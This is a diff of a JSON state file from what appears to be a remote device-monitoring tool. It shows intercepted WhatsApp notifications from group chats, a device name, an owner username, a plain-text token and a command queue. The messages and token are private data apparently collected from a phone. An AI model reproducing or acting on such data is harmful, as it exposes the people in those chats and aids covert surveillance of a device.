@@ -4611,6 +4611,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎GB ZUNZ PEKALONGAN (905 pesan): ~ zunz",
+        "content": "keluar dia",
+        "time": "21/04 17:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776767973754
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎GB ZUNZ PEKALONGAN (904 pesan): ~ ...",
         "content": "jan mau bg",
         "time": "21/04 17:39",
@@ -8600,14 +8608,6 @@
         "time": "21/04 17:11",
         "pkg": "com.whatsapp",
         "receivedAt": 1776766269664
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (149 pesan): ~ N9THCRAL",
-        "content": "Wkwkw aman,🗿🗿🗿😭",
-        "time": "21/04 17:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776766269437
       }
     ],
     "galleryPhotos": [],
@@ -8626,7 +8626,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776767972425,
+    "lastSeen": 1776767972560,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
